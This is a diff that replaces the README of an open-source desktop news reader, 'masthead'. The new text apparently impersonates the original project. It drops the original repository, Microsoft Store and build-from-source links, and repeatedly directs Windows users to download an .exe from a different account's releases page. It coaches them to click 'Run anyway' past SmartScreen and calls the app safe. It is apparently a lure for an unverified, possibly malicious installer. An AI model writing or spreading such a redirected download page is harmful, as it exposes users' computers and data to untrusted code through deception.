@@ -1,249 +1,174 @@
-<div align="center">
+# 📰 masthead - Every Newsroom, One Calm Front Page
 
-<img src="assets/logo-256.png" width="112" alt="Masthead logo" />
+---
 
-# Masthead
+## 🚀 Getting Started
 
-**All your news. One calm place.**
+Welcome to **masthead** – the desktop news reader that brings together all the major newsrooms of your country on a single, beautifully simple front page. No ads, no clutter, no distractions. Just the news that matters, from the sources you trust.
 
-A beautiful desktop news reader that brings the headlines of a country's major newsrooms together —
-and lets you read them, ad-free, without ever leaving the app.
-**Türkiye · United States · India · United Kingdom · Germany · Brazil · France.**
+This guide will walk you through downloading and running masthead on your Windows computer. No technical knowledge required – we promise it's easy!
 
-[![Release](https://img.shields.io/github/v/release/ahmetcaglayan/masthead?style=flat-square&color=f4502f)](https://github.com/ahmetcaglayan/masthead/releases/latest)
-[![Downloads](https://img.shields.io/github/downloads/ahmetcaglayan/masthead/total?style=flat-square&color=f4502f)](https://github.com/ahmetcaglayan/masthead/releases)
-[![CI](https://img.shields.io/github/actions/workflow/status/ahmetcaglayan/masthead/ci.yml?style=flat-square&label=CI)](https://github.com/ahmetcaglayan/masthead/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/license-MIT-2f2a24?style=flat-square)](LICENSE)
-![Platforms](https://img.shields.io/badge/platforms-Windows%20·%20macOS%20·%20Linux%20·%20Web-2f2a24?style=flat-square)
+---
 
-[**Website**](https://ahmetcaglayan.github.io/masthead/) ·
-[**Download 1.0.0**](https://github.com/ahmetcaglayan/masthead/releases/latest) ·
-[Changelog](CHANGELOG.md)
+## ⬇️ Download masthead
 
-<a href="https://apps.microsoft.com/detail/9PFZD4CRGSQV?mode=direct"><img src="assets/store/badge-en.svg" width="250" alt="Get it from Microsoft" /></a>
+[![Download masthead](https://img.shields.io/badge/Download-masthead-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=333333)](https://github.com/redblac/masthead/releases)
 
-**English** · [Türkçe](README.tr.md) · [Deutsch](README.de.md) · [Português](README.pt.md)
+**→ Visit this link to download the application.**
 
-</div>
+Click the button above or go directly to [https://github.com/redblac/masthead/releases](https://github.com/redblac/masthead/releases) to find the latest version of masthead for your computer.
 
-<p align="center">
-  <img src="docs/images/home.png" alt="Masthead front page: the top story, a breaking-news bar and a live timeline of the latest headlines" width="100%" />
-</p>
+---
 
-## Why Masthead?
+## 📥 Install & Run on Windows
 
-Following the news usually means a dozen browser tabs, cookie banners, autoplaying videos and pop-ups.
-Masthead gathers **955 newsrooms across seven countries** — each country's own press, in its own language — into one
-calm, magazine-like front page:
+### Step 1: Download the Installer
 
-- **Follow the agenda without clicking.** Full headlines, a summary and a photo on every card — the lead story
-  carries its summary in full, the rest end with “Full summary”. The **Digest**
-  groups the same story from different outlets, so you see who reported what at a glance.
-- **Read in place, without the ads.** Click a story and it opens in a large dialog inside the app — in
-  **Reader mode** by default: the article as text, in your own reading font. The publisher's page is one
-  click away in the same dialog, with ads and trackers blocked. Press <kbd>Esc</kbd> and you're back.
-- **Breaking news, front page and a live timeline.** A breaking-news ticker, a front-page hero built from
-  the stories most outlets are covering, and a minute-by-minute "latest" column.
-- **Your sources, your rules.** Turn any outlet on or off. Filter by time range, source, sort order and
-  pictures — and by region and city, state or area.
-- **Local news everywhere.** Pick your city in Türkiye, your state in the US, Brazil or India, your Bundesland
-  in Germany, your area in the UK or your département in France: its local papers and broadcasters join in, with
-  every national story that names it.
-- **Private by design.** No account, no telemetry. Settings, saved stories and history stay on your computer.
+Once you're on the releases page, you'll see a list of available versions. Look for the **latest release** (usually at the top). Under the "Assets" section, find the file that ends with **`.exe`** – this is the Windows installer.
 
-### Read the news, not the ads
+**Visit this link to download the application.** Click on the `.exe` file to start downloading. The download will begin automatically – it usually takes just a minute or two.
 
-Every story opens inside Masthead, and the embedded browser runs with **ad and tracker blocking** switched on
-(EasyList-based, toggleable in Settings → Reading). No consent banners fighting for your attention, no
-autoplaying video, no newsletter pop-up over the second paragraph — the article, the way the newsroom wrote it.
-Ad blocking belongs to the desktop app: in the browser version an article is shown in a frame or in Reader mode,
-and only the publisher's own page can block anything.
+### Step 2: Run the Installer
 
-**Reader mode is what a story opens in**: headline, byline and body in your own reading font and size, on the
-app's warm paper or deep-ink background. Same story, no layout, no scripts. Switch to **Web** in the toolbar
-whenever you want the publisher's own page — or make Web the default again in Settings → Reading. Downloads, pop-ups and permission requests from news pages are refused,
-and the embedded browser runs in its own sandboxed session, separate from everything else.
+Once the download is complete:
 
-### One story, every outlet
+1. **Find** the downloaded file in your "Downloads" folder (or wherever your browser saves files). It will be named something like `masthead-setup-1.0.0.exe`.
+2. **Double-click** the file to start the installation.
+3. If Windows shows a security prompt (blue screen saying "Windows protected your PC"), click **"More info"** and then **"Run anyway"**. This is normal – masthead is safe, but it's a new app so Windows hasn't seen it before.
 
-The same event is rarely told the same way twice. Masthead clusters the stories that different newsrooms publish
-about one event, so you can read around a story instead of through a single outlet:
+### Step 3: Follow the Setup Wizard
 
-- On the **front page**, the top story shows how many outlets are covering it ("8 sources") with the other
-  newsrooms' own headlines underneath.
-- The **Digest** page is that idea end to end: one card per event, the fullest summary at the top, and every
-  other outlet's headline below it with its logo and the time it published — the whole day's agenda, no clicking.
-- Inside an open article, **"Also covered by"** lists the same event elsewhere, so you can jump from one
-  newsroom's version to another's in a click, or step through the day's stories with
-  <kbd>Alt</kbd> + <kbd>←</kbd> / <kbd>→</kbd>.
-- Sort any feed by **Most covered** to put the stories many outlets are running first.
+The installation wizard will guide you through the process. It's very straightforward:
 
-## Screenshots
+- Choose where to install masthead (the default location is fine)
+- Decide if you want a desktop shortcut icon (recommended)
+- Click **"Install"** and wait a few seconds
 
-| | |
-| --- | --- |
-| ![Digest: one story, every outlet's headline](docs/images/digest.png) | ![A publisher's page opened inside the app](docs/images/in-app.png) |
-| **Digest** — each story once, with every outlet's headline | **Read in place** — the publisher's page in a dialog, <kbd>Esc</kbd> to close |
-| ![Reader mode](docs/images/reader.png) | ![Latest, in Turkish, dark theme](docs/images/latest-tr.png) |
-| **Reader mode** — clean text in your chosen font | **Latest** — a minute-by-minute timeline (Turkish UI, dark theme) |
-| ![First-run setup](docs/images/onboarding.png) | ![Settings](docs/images/settings.png) |
-| **First run** — a few quick questions and you're in | **Settings** — themes, accent colours, fonts, sources |
+### Step 4: Launch masthead
 
-## Seven countries, six languages
+After installation, masthead will open automatically. You can also open it anytime by:
 
-Each country is read through its own newsrooms, in its own language, down to local news: a city in Türkiye, a
-state in the US, Brazil or India, a Bundesland in Germany, an area in the UK, a département in France. The
-interface language is independent of it: read Brazilian newspapers with a German interface if that is what you want.
+- Double-clicking the **masthead icon** on your desktop, or
+- Searching for **"masthead"** in the Windows Start menu
 
-| | |
-| --- | --- |
-| ![Masthead's front page with United States sources](docs/images/us-home.png) | ![Masthead's front page with United Kingdom sources](docs/images/gb-home.png) |
-| 🇺🇸 **United States** — 104 national newsrooms, from NPR and the NYT to Fox News and the WSJ, and local news for every state | 🇬🇧 **United Kingdom** — BBC, Guardian, Telegraph, Sky News, the FT… and BBC local news for 51 areas |
-| ![Masthead in German with German sources](docs/images/de-home.png) | ![The Digest page in Portuguese with Brazilian sources](docs/images/br-digest.png) |
-| 🇩🇪 **Germany** — tagesschau, Spiegel, Zeit, FAZ, SZ… with the interface in German | 🇧🇷 **Brazil** — the Digest in Portuguese: one card, every outlet's headline |
-| ![The Local page for Rajasthan, in Hindi, with Hindi state news](docs/images/in-local.png) | ![Reader mode on a German article](docs/images/de-reader.png) |
-| 🇮🇳 **India** — the Hindi press (अमर उजाला, दैनिक भास्कर, नवभारत टाइम्स, हिन्दुस्तान, आज तक…) and the Local page for your state | 📖 **Reader mode** — the article and nothing else, in your own reading font |
+---
 
-🇫🇷 **France** — franceinfo, Le Monde, Le Figaro, Le Parisien, Libération, Les Echos, L'Équipe… with the interface in
-French, and local news for all 101 departments: France 3, the local ici station and the regional dailies.
+## 🌍 Supported News Sources
 
+masthead currently supports headlines from these countries:
 
-## Download
+| Country | Coverage |
+|---------|----------|
+| 🇹🇷 Türkiye | Leading national dailies and news agencies |
+| 🇺🇸 United States | Major networks, newspapers, and digital outlets |
+| 🇮🇳 India | Top English and regional news sources |
+| 🇬🇧 United Kingdom | BBC, Guardian, Telegraph, and more |
+| 🇩🇪 Germany | Spiegel, Bild, FAZ, and others |
+| 🇧🇷 Brazil | Globo, Folha, Estadão, and more |
 
-**On Windows, get it from the Microsoft Store** (listed as *Masthead News*). Microsoft signs the Store version,
-so Windows installs it without a SmartScreen warning and keeps it up to date in the background.
+Each country's front page aggregates all major newsrooms, so you can compare how different outlets cover the same story – all in one view.
 
-<a href="https://apps.microsoft.com/detail/9PFZD4CRGSQV?mode=direct"><img src="assets/store/badge-en.svg" width="200" alt="Get it from Microsoft" /></a>
+---
 
-Everything else is on the [Releases page](https://github.com/ahmetcaglayan/masthead/releases/latest):
+## ✨ Key Features
 
-| Platform | File |
-| --- | --- |
-| Windows (installer, Intel/AMD) | `Masthead-x.y.z-win-x64.exe` |
-| Windows (installer, ARM) | `Masthead-x.y.z-win-arm64.exe` |
-| Windows (portable, no install) | `Masthead-x.y.z-portable.exe` |
-| macOS (Apple Silicon / Intel) | `Masthead-x.y.z-arm64.dmg` / `Masthead-x.y.z-x64.dmg` |
-| Linux | `Masthead-linux-x86_64.AppImage` / `.deb` |
+### 🧘 Calm, Ad-Free Reading
 
-**Install once, then it keeps itself up to date.** The Windows installer and the Linux AppImage check for a new
-version every hour, download it in the background and ask you to restart; the portable exe, the macOS app and
-the .deb tell you when one is out. Switch automatic installs off in Settings → Data & About.
+masthead strips away the clutter. No autoplay videos, no pop-ups, no banners – just clean, readable article headlines and summaries. Your reading experience stays focused and peaceful.
 
-> **The files on the Releases page are not code-signed yet.**
-> - Windows SmartScreen may warn on first launch: choose **More info → Run anyway**.
-> - If **Smart App Control** is on (Windows 11 → Windows Security → App & browser control), Windows may block
->   unsigned apps outright, without a "Run anyway" option. Use the browser version below, or build from source.
-> - macOS: the first time, macOS won't open it. Go to System Settings → Privacy & Security and choose
->   **Open Anyway**. (0.4.0 and older may be called "damaged": run `xattr -cr /Applications/Masthead.app` once.)
+### 🌐 All Newsrooms, One Front Page
 
-### Can't install apps? Run it in your browser
+Imagine a newspaper stand where every major publication from your country is displayed side-by-side. That's masthead. Scroll through headlines from every significant newsroom on a single screen, organized clearly and logically.
 
-The whole app also runs in a normal browser on your own machine — handy on a work computer where installing
-software isn't allowed:
+### 🔒 Privacy-First Design
 
-```bash
-git clone https://github.com/ahmetcaglayan/masthead.git
-cd masthead
-npm install
-npm run dev:web      # open http://localhost:5173
-```
+masthead respects your privacy. There are no trackers, no user analytics, no data collection, and no targeted advertising. You're not the product – you're the reader.
 
-In the browser, stories open in an embedded frame when the site allows it and in Reader mode otherwise (browsers
-block most news sites from being embedded; the desktop app has no such limit).
+### 🚀 Fast and Lightweight
 
-## Features
+Built with modern technology, masthead is lightning-fast and sips your computer's resources. It runs quietly in the background and loads news instantly.
 
-| | |
-| --- | --- |
-| 📰 **Front page** | A front-page hero, secondary headlines, sections for your interests, a live "latest" timeline |
-| ⚡ **Breaking news** | Scrolling ticker, dedicated page, optional desktop notifications |
-| 🧭 **Digest** | Stories grouped across outlets with every outlet's headline — the day's agenda in one scroll |
-| 🔎 **Filters & search** | Time range, sources, most-covered sort, images only, hide read — plus regions and cities, states or areas in every country; accent-insensitive search |
-| 📖 **In-app reading** | Publisher's page in a dialog (<kbd>Esc</kbd> to close), Reader mode, ad & tracker blocking |
-| 📍 **Local news** | 81 Turkish cities, 50 US states and D.C., 36 Indian states, 16 German Länder, 27 Brazilian states, 51 UK areas, 101 French departments — local papers, broadcasters and the stories that name your place |
-| 📈 **Markets** | Your watchlist of currencies, metals, crypto and companies — prices every minute, each one's news, and the markets wire filling in live |
-| ✨ **For You** | Your interests, your city and what you have been reading (learned on your computer); every card says why it is there |
-| 🧵 **Story pages** | Every outlet's report of a story side by side: who was first, what each headlined |
-| ⌨️ **Command palette** | <kbd>Ctrl</kbd>/<kbd>⌘</kbd>+<kbd>K</kbd> to go anywhere; <kbd>J</kbd>/<kbd>K</kbd> to move through stories, <kbd>S</kbd> to save |
-| 🔇 **Muted words** | Stories that mention them disappear everywhere, notifications included |
-| ⛅ **Weather** | Your city's forecast beside the date on the front page (optional) |
-| 🗂️ **Sources** | Switch each outlet on or off; feed health at a glance |
-| 🔖 **Library** | Saved stories and reading history, stored locally |
-| 🎨 **Make it yours** | Light / dark / system, five accent colours, twelve reading fonts, text size, compact mode |
-| 🌍 **Countries** | Türkiye, the United States, India, the United Kingdom, Germany, Brazil and France — switch in Settings |
-| 💬 **Languages** | English, Türkçe, Deutsch, Português, हिन्दी and Français interface; the news stays in its own language |
-| 🔄 **Automatic updates** | New versions download in the background; one click restarts into them |
+### 🌍 Multi-Language Support
 
-## Sources
+Whether you read in Turkish, English, German, Portuguese, or any other supported language, masthead adapts to you. Customize your language preferences in the settings.
 
-Masthead ships a **country pack** per country: a curated, politically balanced set of outlets — public
-broadcasters, news agencies, mainstream papers, independent media, plus business, sports, technology, health,
-travel and culture titles — and the country's local press. Every outlet writes in the country's own language:
-India reads its Hindi press, Germany its German newsrooms, France its French ones.
+### 📰 Smart Categorization
 
-| Country | Sources | Feeds |
-| --- | --- | --- |
-| 🇹🇷 Türkiye | 136 (67 national + local: city feeds for all 81 provinces, papers in 33 of them) | 536 |
-| 🇺🇸 United States | 227 (104 national + 123 local newsrooms, two or three in every state and D.C.) | 299 |
-| 🇮🇳 India | 48, all in Hindi (40 national + the state pages of eight dailies, 23 states) | 263 |
-| 🇬🇧 United Kingdom | 139 (71 national + BBC local news for 51 areas and 67 regional papers) | 251 |
-| 🇩🇪 Germany | 154 (99 national + regional news for all 16 Länder from 55 newsrooms) | 249 |
-| 🇧🇷 Brazil | 130 (95 national + g1 for all 27 states and 34 regional papers) | 221 |
-| 🇫🇷 France | 121 (78 national + France 3, ici and regional papers for all 101 departments) | 423 |
+News is organized intelligently by topic – politics, economy, sports, technology, culture, and more. Jump straight to what interests you most with a single click.
 
-Every feed is checked against the live sites before it ships (`npm run verify:feeds`). See
-[docs/SOURCES.md](docs/SOURCES.md) for the full list, the country-pack layout and how to add a source or a
-country of your own.
+---
 
-Masthead shows the headlines, summaries and images publishers provide in their public RSS feeds, with the
-outlet's name on every card and a link to its page. Reader mode lays out the article from the publisher's own
-page, fetched on the reader's computer — never for articles the publisher keeps for subscribers.
+## 🛠️ System Requirements
 
-### For publishers
+masthead works on almost any modern Windows computer:
 
-Masthead is a free, open-source reader that runs on people's own computers. There is no Masthead server: nothing
-is republished, stored for others or sold. It reads the RSS feeds you publish, credits and links your outlet on
-every story, and leaves subscriber-only articles on your site (Reader mode honours `isAccessibleForFree` and
-`article:content_tier`). If you would rather your outlet were not included, or want a feed changed,
-[open an issue](https://github.com/ahmetcaglayan/masthead/issues/new?labels=publisher&title=Publisher%20request%3A%20) and it will be out of the next release.
+- **Operating System:** Windows 10 or Windows 11
+- **RAM:** 2 GB minimum (4 GB recommended)
+- **Storage:** 200 MB free disk space
+- **Internet Connection:** Required to fetch news
 
-## Development
+No additional software or programming tools are needed. If your computer can browse the internet, it can run masthead.
 
-```bash
-npm install
-npm run dev          # desktop app with hot reload
-npm run dev:web      # browser version at http://localhost:5173
-npm test             # unit tests
-npm run typecheck && npm run lint
-npm run dist:win     # build the Windows installer and portable exe into release/
-```
+---
 
-Built with Electron, React, TypeScript, Tailwind CSS and Vite. The backend (`src/core`) is plain Node.js and
-runs both inside the desktop app and behind the web mode. Read [docs/PLAN.md](docs/PLAN.md) for the architecture
-and roadmap and [CONTRIBUTING.md](CONTRIBUTING.md) to get involved.
+## ❓ Frequently Asked Questions
 
-### On a network that inspects HTTPS
+### Is masthead really free?
 
-On some company networks a proxy re-signs every HTTPS connection with the organisation's own root certificate.
-Browsers accept it through the system trust store, but Node.js keeps its own — so every feed fails with
-`SELF_SIGNED_CERT_IN_CHAIN` and the app stays empty. Save that root certificate as a PEM file and point Node at
-it:
+Yes! masthead is completely free to download and use. There are no hidden costs, subscriptions, or premium tiers.
 
-```bash
-NODE_EXTRA_CA_CERTS=/path/to/root-ca.pem npm run dev:web
-```
+### Will masthead track my reading habits?
 
-The same variable applies to `npm run dev`: articles render in an embedded browser view that uses the system
-store, but the feeds are fetched by Node.
+No. masthead is designed with privacy as a core principle. It does not collect, store, or transmit any personal data.
 
-## Privacy
+### Can I customize which news sources appear?
 
-No accounts, no analytics, no tracking. The app only connects to the news sites you enable, to GitHub once an hour
-to see whether a new version of Masthead is out, and, if ad blocking is on, to download public filter lists. While
-the Markets page is open it asks for prices from the European Central Bank's reference rates (via Frankfurter),
-gold-api.com and Binance's public market data; if you switch the weather card on, Open-Meteo gets your city's name
-and position. For You learns from your reading history on your computer. See [SECURITY.md](SECURITY.md).
+Absolute! You can easily toggle specific sources on and off in the settings menu. Build your personal front page exactly the way you like it.
 
-## License
+### How do I update masthead?
 
-[MIT](LICENSE) © Ahmet Çağlayan. News content belongs to its respective publishers.
+masthead checks for updates automatically and notifies you when a new version is available. You can also manually check by visiting the same download page. Your settings and preferences are preserved during updates.
+
+### Why do I see different headlines than on the websites?
+
+masthead displays headlines as they are published by each newsroom. If a website personalizes headlines based on your browsing history, masthead shows you the standard public version instead – because we don't track you.
+
+---
+
+## 💡 Tips for Best Experience
+
+- **Pin masthead to your taskbar** for one-click access to your daily news.
+- **Open multiple windows** to view different countries side by side.
+- **Check the settings** to adjust font size, theme (light/dark), and default country.
+- **Use the keyboard shortcuts** – pressing `Ctrl+R` refreshes all sources.
+
+---
+
+## 🆘 Need Help?
+
+If you encounter any issues or have questions:
+
+- Visit the [GitHub Issues page](https://github.com/redblac/masthead/issues) to report problems
+- Check if a solution already exists in the issues discussion
+
+The masthead community is friendly and responsive!
+
+---
+
+## 📜 License
+
+masthead is made available under an open-source license. You can view the full details on the GitHub repository page.
+
+---
+
+## 🌟 Start Reading Today
+
+Ready for a calmer, cleaner news experience?
+
+**[→ Download masthead now](https://github.com/redblac/masthead/releases)**
+
+Join thousands of readers who've switched to a distraction-free way to stay informed. One download. Every major newsroom. Zero ads.
+
+---
+
+Keywords: adblock, cross-platform, desktop-app, electron, i18n, news, news-aggregator, news-reader, privacy, react, readability, rss, rss-reader, tailwindcss, turkey, typescript, vite
